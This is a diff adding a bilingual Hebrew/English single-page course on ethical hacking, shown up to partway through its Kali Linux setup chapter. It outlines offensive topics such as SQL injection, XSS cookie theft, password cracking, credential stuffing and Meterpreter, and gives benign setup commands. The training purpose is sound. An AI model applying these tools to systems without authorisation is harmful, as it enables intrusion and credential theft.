@@ -1,0 +1,2645 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Red Team — Ethical Hacking</title>
+<style>
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:        #ffffff;
+  --bg2:       #f8f9fa;
+  --bg3:       #f1f3f5;
+  --surface:   #ffffff;
+  --border:    #e9ecef;
+  --border2:   #dee2e6;
+  --accent:    #2d6a4f;
+  --accent2:   #e8f5ef;
+  --accentfg:  #ffffff;
+  --text:      #212529;
+  --text2:     #495057;
+  --text3:     #868e96;
+  --green:     #2f9e44;
+  --red:       #e03131;
+  --orange:    #e8590c;
+  --mono:      'Courier New', 'Consolas', monospace;
+  --sans:      -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  --r:         6px;
+  --r2:        12px;
+  --shadow:    0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.06);
+  --shadow2:   0 4px 12px rgba(0,0,0,.10);
+}
+
+html, body { height: 100%; font-family: var(--sans); background: var(--bg); color: var(--text); font-size: 15px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+
+/* ── HEADER ── */
+.header {
+  position: fixed; top: 0; left: 0; right: 0; height: 56px; z-index: 200;
+  background: var(--bg); border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; padding: 0 20px; gap: 16px;
+}
+.header-logo {
+  font-weight: 700; font-size: 15px; color: var(--text);
+  display: flex; align-items: center; gap: 8px; flex-shrink: 0;
+}
+.header-logo-dot {
+  width: 8px; height: 8px; border-radius: 50%; background: var(--accent);
+}
+.header-chname { font-size: 13px; color: var(--text3); flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.lang-btn {
+  font-size: 12px; font-weight: 600; padding: 5px 12px; border-radius: var(--r);
+  border: 1px solid var(--border2); background: var(--bg2); color: var(--text2);
+  cursor: pointer; flex-shrink: 0; transition: all .15s;
+}
+.lang-btn:hover { background: var(--accent); color: var(--accentfg); border-color: var(--accent); }
+.menu-btn { display: none; background: none; border: none; cursor: pointer; padding: 6px; color: var(--text2); }
+
+/* ── CHAPTER NAV BAR ── */
+.ch-nav {
+  position: fixed; top: 56px; left: 0; right: 0; z-index: 150;
+  background: var(--bg); border-bottom: 1px solid var(--border);
+  overflow-x: auto; display: flex; padding: 0 20px; gap: 4px;
+  scrollbar-width: none; -ms-overflow-style: none;
+}
+.ch-nav::-webkit-scrollbar { display: none; }
+.ch-btn {
+  display: flex; flex-direction: column; align-items: center;
+  padding: 8px 14px 6px; gap: 2px; border: none; background: none;
+  cursor: pointer; border-bottom: 2px solid transparent;
+  color: var(--text3); transition: all .15s; flex-shrink: 0; min-width: 56px;
+}
+.ch-btn:hover { color: var(--text2); background: var(--bg2); }
+.ch-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+.ch-num { font-size: 11px; font-weight: 700; font-family: var(--mono); }
+.ch-title-text { font-size: 10px; max-width: 72px; text-align: center; line-height: 1.2; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; }
+.ch-stars { font-size: 9px; color: var(--orange); min-height: 10px; }
+
+/* ── LAYOUT ── */
+.main { padding-top: 104px; min-height: 100vh; max-width: 900px; margin: 0 auto; padding-left: 24px; padding-right: 24px; padding-bottom: 60px; }
+
+/* ── CHAPTER SECTION ── */
+.chapter { display: none; }
+.chapter.active { display: block; }
+
+/* ── CHAPTER HERO ── */
+.ch-hero {
+  padding: 36px 0 28px; border-bottom: 1px solid var(--border); margin-bottom: 32px;
+}
+.ch-tag { font-size: 11px; font-weight: 700; color: var(--accent); letter-spacing: .08em; text-transform: uppercase; margin-bottom: 8px; font-family: var(--mono); }
+.ch-title { font-size: 28px; font-weight: 800; line-height: 1.2; color: var(--text); margin-bottom: 10px; letter-spacing: -.02em; }
+.ch-desc { font-size: 14px; color: var(--text3); line-height: 1.5; max-width: 580px; margin-bottom: 20px; }
+.tabs-bar { display: flex; gap: 4px; }
+.tab-btn {
+  padding: 7px 16px; font-size: 13px; font-weight: 500; border-radius: var(--r);
+  border: 1px solid transparent; background: var(--bg3); color: var(--text3);
+  cursor: pointer; transition: all .15s;
+}
+.tab-btn:hover { background: var(--bg2); color: var(--text2); border-color: var(--border2); }
+.tab-btn.active { background: var(--accent); color: var(--accentfg); border-color: var(--accent); }
+
+/* ── TAB PANELS ── */
+.tab-panels { }
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+
+/* ── LEARN CONTENT ── */
+.did-you-know {
+  background: var(--bg2); border-left: 3px solid var(--accent);
+  padding: 14px 16px; border-radius: 0 var(--r) var(--r) 0;
+  font-size: 13.5px; color: var(--text2); margin-bottom: 28px; line-height: 1.6;
+}
+.section-title {
+  font-size: 18px; font-weight: 700; color: var(--text); margin: 32px 0 12px;
+  letter-spacing: -.01em;
+}
+.section-title:first-of-type { margin-top: 0; }
+.prose {
+  font-size: 15px; color: var(--text2); line-height: 1.75; margin-bottom: 14px;
+}
+.prose code, code {
+  font-family: var(--mono); font-size: 12.5px; background: var(--bg3);
+  padding: 1px 5px; border-radius: 3px; color: var(--text);
+}
+
+/* ── CODE BLOCKS ── */
+.code-block {
+  background: #1e1e2e; border-radius: var(--r2); padding: 18px 20px;
+  margin: 16px 0; overflow-x: auto;
+}
+.code-block code {
+  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
+  background: none; padding: 0; color: #cdd6f4; display: block;
+}
+.comment { color: #6c7086; }
+.key { color: #89b4fa; }
+.str { color: #a6e3a1; }
+.val { color: #fab387; }
+
+/* ── GRID ── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 16px 0 24px; }
+.grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin: 16px 0 24px; }
+
+/* ── CARDS ── */
+.card {
+  background: var(--bg); border: 1px solid var(--border); border-radius: var(--r2);
+  padding: 18px; display: flex; flex-direction: column; gap: 6px;
+  box-shadow: var(--shadow);
+}
+.card-icon { font-size: 22px; }
+.card-title { font-size: 13px; font-weight: 700; color: var(--text); }
+.card-body { font-size: 13px; color: var(--text3); line-height: 1.55; }
+
+/* ── TABLE ── */
+.table-wrap { overflow-x: auto; margin: 16px 0 24px; border-radius: var(--r2); border: 1px solid var(--border); box-shadow: var(--shadow); }
+.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+.data-table thead { background: var(--bg3); }
+.data-table th { padding: 10px 14px; text-align: left; font-weight: 600; color: var(--text2); font-size: 12px; text-transform: uppercase; letter-spacing: .04em; border-bottom: 1px solid var(--border); }
+.data-table td { padding: 10px 14px; color: var(--text2); border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.5; }
+.data-table tr:last-child td { border-bottom: none; }
+.data-table tr:hover td { background: var(--bg2); }
+
+/* ── FLOW ── */
+.flow-row { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; margin: 16px 0 24px; padding: 20px; background: var(--bg2); border-radius: var(--r2); border: 1px solid var(--border); }
+.flow-step { display: flex; flex-direction: column; align-items: center; gap: 4px; text-align: center; }
+.flow-step-icon { font-size: 22px; }
+.flow-step-label { font-size: 10px; color: var(--text3); line-height: 1.3; max-width: 64px; }
+.flow-arrow { color: var(--accent); font-size: 16px; font-weight: 700; flex-shrink: 0; }
+
+/* ── CALLOUTS ── */
+.callout { padding: 12px 16px; border-radius: var(--r); font-size: 13.5px; line-height: 1.6; margin: 16px 0; }
+.callout-info { background: #eff6ff; border-left: 3px solid #3b82f6; color: #1e40af; }
+.callout-warn { background: #fffbeb; border-left: 3px solid #f59e0b; color: #92400e; }
+.callout-tip  { background: #f0fdf4; border-left: 3px solid #22c55e; color: #14532d; }
+.callout-success { background: var(--bg2); border: 1px solid var(--border); color: var(--text2); border-radius: var(--r); padding: 10px 14px; margin-bottom: 14px; }
+
+/* ── REAL-WORLD BOX ── */
+.real-world-box {
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: var(--r2); padding: 20px; margin: 24px 0;
+  box-shadow: var(--shadow);
+}
+.real-world-title { font-size: 13px; font-weight: 700; color: var(--accent); margin-bottom: 10px; }
+.real-world-body { font-size: 13.5px; color: var(--text2); line-height: 1.7; }
+
+/* ── BADGE ── */
+.badge { display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 7px; border-radius: 20px; font-family: var(--mono); }
+.badge-new  { background: #dcfce7; color: #166534; }
+.badge-hot  { background: #fee2e2; color: #991b1b; }
+.badge-exp  { background: #fffbeb; color: #92400e; }
+.badge-prod { background: #eff6ff; color: #1e40af; }
+
+/* ── CHEAT SHEET ── */
+.cheat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 12px; margin-top: 8px; }
+.cheat-card { background: var(--bg); border: 1px solid var(--border); border-radius: var(--r); padding: 14px; }
+.cheat-card-title { font-size: 12px; font-weight: 700; color: var(--accent); margin-bottom: 10px; text-transform: uppercase; letter-spacing: .06em; font-family: var(--mono); }
+.cheat-item { display: flex; justify-content: space-between; gap: 8px; padding: 4px 0; border-bottom: 1px solid var(--border); font-size: 12.5px; }
+.cheat-item:last-child { border-bottom: none; }
+.cheat-key { font-family: var(--mono); color: var(--accent); font-weight: 600; font-size: 11.5px; flex-shrink: 0; }
+.cheat-val { color: var(--text3); text-align: right; font-size: 11.5px; }
+
+/* ── GAME ── */
+.game-start-card { max-width: 420px; margin: 0 auto; text-align: center; padding: 48px 24px; }
+.game-icon { font-size: 48px; margin-bottom: 16px; }
+.game-start-title { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 8px; letter-spacing: -.02em; }
+.game-start-desc { font-size: 14px; color: var(--text3); margin-bottom: 24px; }
+.game-rules { display: flex; justify-content: center; gap: 24px; margin-bottom: 28px; }
+.game-rule { font-size: 13px; color: var(--text2); }
+.btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 22px; border-radius: var(--r); font-size: 14px; font-weight: 600; border: none; cursor: pointer; transition: all .15s; }
+.btn-primary { background: var(--accent); color: var(--accentfg); }
+.btn-primary:hover { opacity: .9; transform: translateY(-1px); box-shadow: var(--shadow2); }
+.btn-ghost { background: var(--bg2); color: var(--text2); border: 1px solid var(--border2); }
+.btn-ghost:hover { background: var(--bg3); }
+.game-hud { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding: 12px 16px; background: var(--bg2); border-radius: var(--r); border: 1px solid var(--border); }
+.hud-score { font-size: 20px; font-weight: 800; color: var(--accent); font-family: var(--mono); }
+.hud-timer { font-size: 14px; font-weight: 600; color: var(--text2); font-family: var(--mono); }
+.game-q-text { font-size: 17px; font-weight: 600; color: var(--text); margin-bottom: 20px; line-height: 1.5; }
+.game-opts { display: flex; flex-direction: column; gap: 10px; }
+.game-opt {
+  display: flex; align-items: center; gap: 12px;
+  padding: 14px 16px; border-radius: var(--r); border: 1.5px solid var(--border);
+  background: var(--bg); cursor: pointer; transition: all .15s;
+  font-size: 14px; color: var(--text2); font-weight: 500;
+}
+.game-opt:hover { border-color: var(--accent); color: var(--text); background: var(--bg2); }
+.game-opt.correct { border-color: var(--green); background: #f0fdf4; color: var(--green); }
+.game-opt.wrong   { border-color: var(--red); background: #fff1f2; color: var(--red); }
+.opt-letter { width: 24px; height: 24px; border-radius: 50%; background: var(--bg3); display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; color: var(--text3); font-family: var(--mono); }
+.game-result-card { max-width: 420px; margin: 40px auto 0; text-align: center; }
+.result-score { font-size: 56px; font-weight: 900; color: var(--accent); font-family: var(--mono); margin-bottom: 4px; }
+.result-label { font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 24px; }
+.result-btns { display: flex; gap: 10px; justify-content: center; }
+
+/* ── QUIZ ── */
+.quiz-wrap { max-width: 680px; }
+.quiz-progress { display: flex; gap: 4px; margin-bottom: 24px; }
+.quiz-prog-dot { flex: 1; height: 3px; border-radius: 2px; background: var(--border2); }
+.quiz-prog-dot.done { background: var(--accent); }
+.quiz-prog-dot.current { background: var(--accent); opacity: .5; }
+.quiz-q-text { font-size: 17px; font-weight: 600; color: var(--text); margin-bottom: 20px; line-height: 1.5; }
+.quiz-opts { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+.quiz-opt {
+  display: flex; align-items: center; gap: 12px;
+  padding: 13px 16px; border-radius: var(--r); border: 1.5px solid var(--border);
+  background: var(--bg); cursor: pointer; transition: all .15s;
+  font-size: 14px; color: var(--text2);
+}
+.quiz-opt:hover { border-color: var(--accent); }
+.quiz-opt.selected { border-color: var(--accent); background: var(--bg2); color: var(--text); }
+.quiz-opt.correct { border-color: var(--green); background: #f0fdf4; }
+.quiz-opt.wrong   { border-color: var(--red); background: #fff1f2; }
+.quiz-explain { padding: 12px 16px; background: var(--bg2); border-radius: var(--r); font-size: 13.5px; color: var(--text2); margin: 12px 0; line-height: 1.6; border-left: 3px solid var(--accent); }
+.quiz-actions { display: flex; gap: 10px; }
+.quiz-result { text-align: center; padding: 40px 20px; }
+.qr-score { font-size: 52px; font-weight: 900; font-family: var(--mono); color: var(--accent); }
+.qr-label { font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 24px; }
+
+/* ── LAB ── */
+.lab-wrap { max-width: 720px; }
+
+/* ── CREDITS ── */
+.credits-bar { border-top: 1px solid var(--border); padding: 32px 0; margin-top: 48px; }
+.credits-title { font-size: 10px; font-weight: 700; color: var(--accent); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 16px; font-family: var(--mono); }
+.credits-grid { display: flex; flex-wrap: wrap; gap: 24px; }
+.credit-group { flex: 1; min-width: 140px; }
+.credit-group-title { font-size: 11px; font-weight: 700; color: var(--text2); margin-bottom: 8px; }
+.credit-item { font-size: 12px; color: var(--text3); line-height: 1.8; }
+.credit-item a { color: var(--accent); text-decoration: none; }
+.credit-item a:hover { text-decoration: underline; }
+
+/* ── MOBILE ── */
+@media (max-width: 700px) {
+  .main { padding-top: 100px; padding-left: 16px; padding-right: 16px; }
+  .ch-title { font-size: 22px; }
+  .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  .menu-btn { display: block; }
+  .flow-row { gap: 4px; padding: 14px; }
+  .flow-step-label { font-size: 9px; max-width: 54px; }
+  .game-rules { gap: 14px; }
+  .quiz-actions { flex-wrap: wrap; }
+}
+@media (max-width: 480px) {
+  .ch-nav { padding: 0 12px; }
+  .ch-btn { padding: 8px 10px; min-width: 46px; }
+  .ch-title-text { max-width: 56px; font-size: 9px; }
+}
+
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-logo">
+    <div class="header-logo-dot"></div>
+    <span>Red Team</span>
+  </div>
+  <span class="header-chname" id="headerChName"></span>
+  <button class="lang-btn" id="langBtn" onclick="toggleLang()">🇬🇧 EN</button>
+</header>
+
+<nav class="ch-nav" id="sidebar">
+  <div class="sb-label" id="sbLabel" style="display:none"></div>
+  
+  <button class="ch-btn" id="nav-0" onclick="showChapter(0)"><span class="ch-num">00</span><span class="ch-title-text" id="chname-0"></span><span class="ch-stars" id="stars-0"></span></button>
+  <button class="ch-btn" id="nav-1" onclick="showChapter(1)"><span class="ch-num">01</span><span class="ch-title-text" id="chname-1"></span><span class="ch-stars" id="stars-1"></span></button>
+  <button class="ch-btn" id="nav-2" onclick="showChapter(2)"><span class="ch-num">02</span><span class="ch-title-text" id="chname-2"></span><span class="ch-stars" id="stars-2"></span></button>
+  <button class="ch-btn" id="nav-3" onclick="showChapter(3)"><span class="ch-num">03</span><span class="ch-title-text" id="chname-3"></span><span class="ch-stars" id="stars-3"></span></button>
+  <button class="ch-btn" id="nav-4" onclick="showChapter(4)"><span class="ch-num">04</span><span class="ch-title-text" id="chname-4"></span><span class="ch-stars" id="stars-4"></span></button>
+  <button class="ch-btn" id="nav-5" onclick="showChapter(5)"><span class="ch-num">05</span><span class="ch-title-text" id="chname-5"></span><span class="ch-stars" id="stars-5"></span></button>
+  <button class="ch-btn" id="nav-6" onclick="showChapter(6)"><span class="ch-num">06</span><span class="ch-title-text" id="chname-6"></span><span class="ch-stars" id="stars-6"></span></button>
+  <button class="ch-btn" id="nav-7" onclick="showChapter(7)"><span class="ch-num">07</span><span class="ch-title-text" id="chname-7"></span><span class="ch-stars" id="stars-7"></span></button>
+</nav>
+
+<main class="main" id="main">
+
+<section class="chapter" id="ch-0">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-0"></div>
+    <h1 class="ch-title" id="chtitle-0"></h1>
+    <p class="ch-desc" id="chdesc-0"></p>
+    <div class="tabs-bar" id="tabs-0"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="0-learn"><div id="learn-0"></div></div>
+    <div class="tab-panel" id="0-quiz"><div class="quiz-wrap" id="quiz-0"></div></div>
+    <div class="tab-panel" id="0-lab"><div class="lab-wrap" id="lab-0"></div></div>
+    <div class="tab-panel" id="0-game"><div class="game-wrap" id="game-0"></div></div>
+    <div class="tab-panel" id="0-cheat"><div id="cheat-0"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-1">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-1"></div>
+    <h1 class="ch-title" id="chtitle-1"></h1>
+    <p class="ch-desc" id="chdesc-1"></p>
+    <div class="tabs-bar" id="tabs-1"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="1-learn"><div id="learn-1"></div></div>
+    <div class="tab-panel" id="1-quiz"><div class="quiz-wrap" id="quiz-1"></div></div>
+    <div class="tab-panel" id="1-lab"><div class="lab-wrap" id="lab-1"></div></div>
+    <div class="tab-panel" id="1-game"><div class="game-wrap" id="game-1"></div></div>
+    <div class="tab-panel" id="1-cheat"><div id="cheat-1"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-2">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-2"></div>
+    <h1 class="ch-title" id="chtitle-2"></h1>
+    <p class="ch-desc" id="chdesc-2"></p>
+    <div class="tabs-bar" id="tabs-2"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="2-learn"><div id="learn-2"></div></div>
+    <div class="tab-panel" id="2-quiz"><div class="quiz-wrap" id="quiz-2"></div></div>
+    <div class="tab-panel" id="2-lab"><div class="lab-wrap" id="lab-2"></div></div>
+    <div class="tab-panel" id="2-game"><div class="game-wrap" id="game-2"></div></div>
+    <div class="tab-panel" id="2-cheat"><div id="cheat-2"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-3">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-3"></div>
+    <h1 class="ch-title" id="chtitle-3"></h1>
+    <p class="ch-desc" id="chdesc-3"></p>
+    <div class="tabs-bar" id="tabs-3"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="3-learn"><div id="learn-3"></div></div>
+    <div class="tab-panel" id="3-quiz"><div class="quiz-wrap" id="quiz-3"></div></div>
+    <div class="tab-panel" id="3-lab"><div class="lab-wrap" id="lab-3"></div></div>
+    <div class="tab-panel" id="3-game"><div class="game-wrap" id="game-3"></div></div>
+    <div class="tab-panel" id="3-cheat"><div id="cheat-3"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-4">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-4"></div>
+    <h1 class="ch-title" id="chtitle-4"></h1>
+    <p class="ch-desc" id="chdesc-4"></p>
+    <div class="tabs-bar" id="tabs-4"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="4-learn"><div id="learn-4"></div></div>
+    <div class="tab-panel" id="4-quiz"><div class="quiz-wrap" id="quiz-4"></div></div>
+    <div class="tab-panel" id="4-lab"><div class="lab-wrap" id="lab-4"></div></div>
+    <div class="tab-panel" id="4-game"><div class="game-wrap" id="game-4"></div></div>
+    <div class="tab-panel" id="4-cheat"><div id="cheat-4"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-5">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-5"></div>
+    <h1 class="ch-title" id="chtitle-5"></h1>
+    <p class="ch-desc" id="chdesc-5"></p>
+    <div class="tabs-bar" id="tabs-5"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="5-learn"><div id="learn-5"></div></div>
+    <div class="tab-panel" id="5-quiz"><div class="quiz-wrap" id="quiz-5"></div></div>
+    <div class="tab-panel" id="5-lab"><div class="lab-wrap" id="lab-5"></div></div>
+    <div class="tab-panel" id="5-game"><div class="game-wrap" id="game-5"></div></div>
+    <div class="tab-panel" id="5-cheat"><div id="cheat-5"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-6">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-6"></div>
+    <h1 class="ch-title" id="chtitle-6"></h1>
+    <p class="ch-desc" id="chdesc-6"></p>
+    <div class="tabs-bar" id="tabs-6"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="6-learn"><div id="learn-6"></div></div>
+    <div class="tab-panel" id="6-quiz"><div class="quiz-wrap" id="quiz-6"></div></div>
+    <div class="tab-panel" id="6-lab"><div class="lab-wrap" id="lab-6"></div></div>
+    <div class="tab-panel" id="6-game"><div class="game-wrap" id="game-6"></div></div>
+    <div class="tab-panel" id="6-cheat"><div id="cheat-6"></div></div>
+  </div>
+</section>
+<section class="chapter" id="ch-7">
+  <div class="ch-hero">
+    <div class="ch-tag" id="chtag-7"></div>
+    <h1 class="ch-title" id="chtitle-7"></h1>
+    <p class="ch-desc" id="chdesc-7"></p>
+    <div class="tabs-bar" id="tabs-7"></div>
+  </div>
+  <div class="tab-panels">
+    <div class="tab-panel active" id="7-learn"><div id="learn-7"></div></div>
+    <div class="tab-panel" id="7-quiz"><div class="quiz-wrap" id="quiz-7"></div></div>
+    <div class="tab-panel" id="7-lab"><div class="lab-wrap" id="lab-7"></div></div>
+    <div class="tab-panel" id="7-game"><div class="game-wrap" id="game-7"></div></div>
+    <div class="tab-panel" id="7-cheat"><div id="cheat-7"></div></div>
+  </div>
+</section>
+<div class="credits-bar" id="credits-bar">
+  <div class="credits-title" id="credits-title-label">// Sources & Credits</div>
+  <div class="credits-grid">
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-research">Research</div>
+      <div class="credit-item">OWASP Testing Guide</div>
+      <div class="credit-item">MITRE ATT&amp;CK Framework</div>
+      <div class="credit-item">Offensive Security (OSCP)</div>
+    </div>
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-tech">Platforms</div>
+      <div class="credit-item"><a href="https://hackthebox.com" target="_blank">HackTheBox</a></div>
+      <div class="credit-item"><a href="https://tryhackme.com" target="_blank">TryHackMe</a></div>
+      <div class="credit-item"><a href="https://gtfobins.github.io" target="_blank">GTFOBins</a></div>
+    </div>
+    <div class="credit-group">
+      <div class="credit-group-title" id="credits-built">Built With</div>
+      <div class="credit-item">Claude (Anthropic)</div>
+      <div class="credit-item" id="credits-version">v2.0 — 2025</div>
+    </div>
+  </div>
+</div>
+</main>
+
+</body>
+</html>
+<script>
+const C = {
+he:{
+  dir:'rtl',lang:'he',langBtn:'🇬🇧 EN',sbLabel:'פרקים',
+  names:["Kali Linux — סביבת העבודה", "Reconnaissance — מיפוי יעד", "SQL Injection — כיצד ולמה", "XSS — Cross-Site Scripting", "Burp Suite — Web Testing", "Password Attacks — שבירת סיסמאות", "Metasploit — Exploitation Framework", "CTF — תרגול ולמידה"],
+  tags:["// פרק 00", "// פרק 01", "// פרק 02", "// פרק 03", "// פרק 04", "// פרק 05", "// פרק 06", "// פרק 07"],
+  descs:["Kali tools, setup, מה כלול ולמה, VirtualBox/VM, קדים להתקנה", "OSINT, Nmap, subdomain enumeration, Shodan, passive vs active recon", "Manual SQLi, sqlmap, blind SQLi, union-based, error-based, time-based", "Reflected, Stored, DOM XSS, Cookie theft, CSP, XSS bypass techniques", "Proxy, Repeater, Intruder, Scanner, intercept, מניפולציה של requests", "Hashing, rainbow tables, hashcat, hydra, credential stuffing", "msfconsole, modules, Meterpreter, payloads, post-exploitation", "CTF categories, HackTheBox, TryHackMe, methodology, legal practice environments"],
+  tabs:['📖 למידה','🎮 משחק','📋 סיכום'],
+  tabKeys:['learn','game','cheat'],
+  gameTitle:'QUIZ',gameDesc:'ענה מהר. כל תשובה נכונה = +10 נקודות.',
+  gameStart:'▶ התחל',gameSeconds:'שניות',gameQuestions:'שאלות',gameXP:'+10 XP',
+  gameAgain:'🔄 שוב',gameToCheat:'📋 סיכום ←',
+  quizPrev:'→ הקודם',quizNext:'הבא ←',quizSubmit:'שלח ✓',
+  quizExplain:'💡 הסבר:',quizToLab:'',quizAgain:'🔄 שוב',
+  resultLabels:['נסי שוב!','עוד קצת...','טוב!','כל הכבוד!','מצוין!','מושלם! 🎯'],
+  lbTitle:'// לוח תוצאות',labExplain:'💡 הסבר:',
+  points:"נק'",of:'מתוך',question:'שאלה',
+  optLetters:['א','ב','ג','ד'],playerName:'את',unknownPlayer:'שחקן',pct:'% נכון',
+  learn:[
+`<div class="did-you-know">💡 <strong>ידעת?</strong> Kali Linux מגיעה עם 600+ כלים לpenetration testing — מוגדרים מראש, מעודכנים, ומנוהלים. מה שלוקח שעות להגדיר ב-Ubuntu (Nmap, Metasploit, Burp Suite, Wireshark) — ב-Kali מגיע ב-ISO אחד. Offensive Security (החברה שמפתחת Kali) גם מנהלת את OSCP — אחת מהסמכויות היוקרתיות ביותר ב-penetration testing.</div>
+
+<div class="section-title">מה זה Kali ולמה Debian-based?</div>
+<p class="prose">Kali Linux היא distribution שמבוססת על Debian ומיועדת בלעדית לpenetration testing, digital forensics, ו-red team operations. היא לא מיועדת לשימוש יומיומי — ולא צריך להתקין אותה כ-main OS. הדרך הנכונה: VM (VirtualBox, VMware) שמאפשרת לך לנתק, לbackup, ולהריץ snapshots לפני engagement.</p>
+<p class="prose">היתרון של Kali על Ubuntu רגיל: כל הtools מגיעים עם configuration מותאם לpentesting. Metasploit מוגדר. PostgreSQL לmsfdb. Burp Suite CA מותקן. Wordlists ב-/usr/share/wordlists. זה חוסך שעות של setup בתחילת כל engagement.</p>
+
+<div class="section-title">הכלים המרכזיים</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>קטגוריה</th><th>כלים</th><th>שימוש</th></tr></thead><tbody>
+<tr><td>Reconnaissance</td><td>Nmap, theHarvester, Maltego, Amass</td><td>מיפוי targets</td></tr>
+<tr><td>Web Testing</td><td>Burp Suite, OWASP ZAP, sqlmap, nikto</td><td>web vulnerabilities</td></tr>
+<tr><td>Exploitation</td><td>Metasploit, searchsploit</td><td>exploit ידוע CVEs</td></tr>
+<tr><td>Password</td><td>hashcat, john, hydra, medusa</td><td>crack hashes, brute force</td></tr>
+<tr><td>Wireless</td><td>aircrack-ng, reaver, wifite</td><td>WiFi assessment</td></tr>
+<tr><td>Forensics</td><td>Autopsy, Volatility, binwalk</td><td>digital forensics</td></tr>
+</tbody></table></div>
+
+<div class="section-title">VM Setup — הדרך הנכונה</div>
+<pre class="code-block"><code><span class="comment"># VirtualBox settings ל-Kali</span>
+RAM: 4GB minimum (8GB recommended for Metasploit)
+Storage: 40GB+ (כלים ו-captures לוקחים מקום)
+Network: NAT (לinternet) + Host-Only (לlab)
+Display: 128MB VRAM, Enable 3D
+
+<span class="comment"># אחרי התקנה — עדכון ראשוני</span>
+sudo apt update && sudo apt full-upgrade -y
+sudo apt install -y kali-linux-large  <span class="comment"># כל הtoolset</span>
+
+<span class="comment"># msfdb init — Metasploit database</span>
+sudo msfdb init
+msfconsole -q -x "db_status"
+<span class="comment"># [*] Connected to msf. Connection type: postgresql</span>
+
+<span class="comment"># Wordlists — חיוניות לpentesting</span>
+ls /usr/share/wordlists/
+gunzip /usr/share/wordlists/rockyou.txt.gz  <span class="comment"># 14M סיסמאות</span></code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Kali בCloud — Pentesting בלי laptop כבד</div>
+  <div class="real-world-body">
+    Offensive Security מציעה Kali Cloud images ל-AWS, Azure, ו-GCP. Pentesters מריצים Kali על EC2 t3.medium (2 vCPU, 4GB RAM, $0.04/hr) קרוב ל-target — מפחית latency בscanning ומסתיר את ה-IP האמיתי. Kali nethunter (Android) מאפשר pentesting ממכשיר נייד. Kali WSL (Windows Subsystem for Linux) לפיתוח על Windows עם tools מלאים.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">לפני כל engagement, הסביבה צריכה להיות מוגדרת נכון. שיטת עבודה מסודרת חוסכת שעות של debugging ומבטיחה שהממצאות תועדו כראוי.</p>
+
+<div class="section-title">Workspace Structure</div>
+<pre class="code-block"><code><span class="comment"># צור תיקיית engagement מסודרת</span>
+mkdir -p ~/engagements/client_2025_01/{recon,scans,exploits,loot,reports}
+cd ~/engagements/client_2025_01
+
+<span class="comment"># תיעוד — כל פקודה ותוצאה</span>
+script -a logs/session_$(date +%Y%m%d_%H%M).log
+<span class="comment"># מעכשיו הכל מוקלט אוטומטית</span>
+
+<span class="comment"># VPN לengagement (לרוב נדרש)</span>
+sudo openvpn --config client.ovpn --daemon
+ip addr show tun0   <span class="comment"># אמת שmחובר</span>
+
+<span class="comment"># עדכן כלים לפני engagement</span>
+sudo apt update && sudo apt upgrade -y
+msfdb reinit   <span class="comment"># Metasploit DB</span></code></pre>
+
+<div class="section-title">Tmux — עבודה מסודרת ב-terminal</div>
+<pre class="code-block"><code><span class="comment"># Tmux setup — כמה panes ביחד</span>
+tmux new -s pentest
+
+<span class="comment"># split windows:</span>
